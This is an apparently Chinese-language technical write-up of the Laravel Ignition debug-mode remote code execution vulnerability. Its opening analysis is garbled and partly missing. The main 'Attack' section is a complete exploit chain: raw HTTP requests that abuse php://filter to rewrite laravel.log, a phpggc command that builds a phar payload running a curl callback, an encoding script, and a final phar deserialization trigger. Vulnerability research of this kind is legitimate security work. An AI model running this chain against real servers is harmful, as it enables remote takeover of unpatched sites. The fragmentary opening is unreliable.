[TOC]
### 0x00 漏洞成因
影响版本：Ignitionbase64->utf8转utf16le`，下面看如何构造这个payload，也就是utf-8如何转成utf-16le，这里做个实验，看看两者的区别。
    utf-8`时又会抛出一条新日志，这样后续的base64
decode就会失败了。由于我们的poc会在log中出现两次，因此所有poc字符数必然是偶数个，影响log文件字符数奇偶的只能是log框架文本本身的字符数。只要在我们发送poc之前提前发送一个偶数文件名的请求，这样最终的log中就会有两次log框架本身的字符，因此必为偶数。
### 0x02 Attack
#### step0 清除原log中的字符
    POST /_ignition/execute-solution HTTP/1.1
    Host: 127.0.0.1:8000
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 217
    solution=Facade\Ignition\Solutions\MakeViewVariableOptionalSolution&parameters[variableName]=123&parameters[viewFile]=php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log
#### step1 发送偶数文件名的请求
（对应坑3）
    POST /_ignition/execute-solution HTTP/1.1
    Host: 127.0.0.1:8000
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 120
    solution=Facade\Ignition\Solutions\MakeViewVariableOptionalSolution&parameters[variableName]=123&parameters[viewFile]=11
#### step2 发送poc
    POST /_ignition/execute-solution HTTP/1.1
    Host: 127.0.0.1:8000
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 2401
    solution=Facade\Ignition\Solutions\MakeViewVariableOptionalSolution&parameters[variableName]=123&parameters[viewFile]=xxxxx
`xxxxx`就是payload，通过以下步骤获得：
    ./phpggc monolog/rce1 system "curl http://ip/success" --phar phar -o php://output | base64
把输出的结果经过下面的python脚本转换一下：
    from binascii import b2a_hex
    payload = "xxx" # base64 payload
    armedPayload = ''
    for i in payload:
        i = "="+b2a_hex(i.encode('utf-8')).decode('utf-8').upper()
        armedPayload += i+"=00"
    print("123456789012345"+armedPayload)#前面加15个字符，对应坑1
这里输出的结果直接放到上面的文件名中。
#### step3 清空垃圾字符，poc解码成phar文件内容
    POST /_ignition/execute-solution HTTP/1.1
    Host: 127.0.0.1:8000
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 310
    solution=Facade\Ignition\Solutions\MakeViewVariableOptionalSolution&parameters[variableName]=123&parameters[viewFile]=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
#### step4 触发phar反序列化
    POST /_ignition/execute-solution HTTP/1.1
    Host: 127.0.0.1:8000
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 206
    solution=Facade\Ignition\Solutions\MakeViewVariableOptionalSolution&parameters[variableName]=123&parameters[viewFile]=phar:///xxxx/laravel/storage/logs/laravel.log
注意这里的路径要换成`laravel.log`的绝对路径。
### 0x03 思考
在刚拿到这个漏洞时仅看了漏洞通告以及git补丁，先通过Ignition文档了解了Solution的作用和调用方式，然后发现Solution似乎只有在`blade`模版出错时才会被调用到，可是没法手动指定模版，所以这个洞也就没有找到入口。看了眼exp的url，发现竟然是诡异的`/_ignition/`，这个路由在Laravel给的Controller中是没有的。翻了下Ignition的源码，发现这个项目动态添加了路由并注册了几个Controller，最后才到了调用点。
这个漏洞的主要攻击方式就是phar，不过最有意思的点是利用`php://filter`伪协议将一个部分可控的文件变成完全可控，这个漏洞是先通过`file_put_contents()`写文件时用`php://filter/write=xxx`来进行解码，其实也可以使用`php://filter/read=xxx`在`file_get_contents()`处进行解码。
对于这个漏洞，发现者还提出了一种利用FTP被动模式攻击PHP-FPM的攻击思路。第一次使用`file_get_contents()`请求恶意ftp请求，获取payload，然后通过`file_put_contents()`结合FTP被动模式，把上面的payload发送到php-fpm的端口实现RCE。
这里贴两篇文章，以后再细说，留个坑。：）
[技术干货 | LARAVEL <= V8.4.2
调试模式下的RCE分析](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247499853&idx=1&sn=225ce332407f61a2181b636e86545dab&chksm=)
[hxp2020的resonator题解分析](https://www.anquanke.com/post/id/226750)
### 0x04 参考
[Laravel <= v8.4.2 debug mode: Remote code
execution](https://www.ambionics.io/blog/laravel-debug-rce)  
[PHP Conversion Filters](https://www.php.net/manual/en/filters.convert.php)  
[Using solution providers](https://flareapp.io/docs/solutions/using-solution-providers)